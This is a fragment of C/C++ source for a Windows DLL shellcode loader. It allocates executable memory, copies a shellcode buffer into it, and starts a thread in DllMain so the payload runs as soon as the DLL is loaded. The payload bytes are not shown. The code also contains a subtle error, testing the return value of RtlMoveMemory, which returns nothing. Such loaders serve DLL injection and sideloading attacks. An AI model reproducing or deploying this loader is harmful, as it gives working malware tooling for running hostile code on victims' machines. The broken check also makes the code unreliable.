...
DWORD WINAPI ShellcodeExec(LPVOID lpParameter) {
    // Allocate memory in the current process to hold the shellcode
    void* exec_mem = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (exec_mem == NULL) {
        // Handle error by logging it
        OutputDebugString(L"Error: VirtualAlloc failed to allocate memory.\n");
        return EXIT_FAILURE;
    }

    // Copy the shellcode to the memory
    if (!RtlMoveMemory(exec_mem, shellcode, sizeof(shellcode))) {
        // Handle error by logging it
        OutputDebugString(L"Error: RtlMoveMemory failed to copy the shellcode.\n");
    ...
    // Free the allocated memory (optional, as the process will exit)
    VirtualFree(exec_mem, 0, MEM_RELEASE);
...
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
	...
	case DLL_PROCESS_ATTACH:
		CreateThread(NULL, 0, ShellcodeExec, NULL, 0, NULL);
		break;
